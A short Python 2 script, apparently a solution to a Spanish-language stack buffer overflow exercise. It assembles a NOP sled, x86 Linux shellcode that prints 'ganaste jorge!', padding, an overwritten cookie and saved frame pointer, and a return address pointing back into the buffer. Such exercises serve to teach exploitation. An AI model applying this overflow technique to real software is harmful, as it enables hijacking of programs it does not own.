# payload.py
from struct import pack

# shellcode: imprime "ganaste jorge!"
shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x67\x61\x6e\x61\x73\x74\x65\x20\x6a\x6f\x72\x67\x65\x21\x0b"

ret_addr = 0xbffff5a4                             # <-- PON AQUI tu direccion de buf (con 0x)

buf_len  = 80                                      # = cookie - buf
output  = "\x90" * 20                              # tobogan de NOPs
output += shellcode                                # shellcode
output += "A" * (buf_len - 20 - len(shellcode))    # relleno hasta fin de buf
output += "BBBB"                                   # cookie
output += "CCCC"                                   # ebp guardado
output += pack("<I", ret_addr)                     # retorno -> apunta a los NOPs de buf

print output
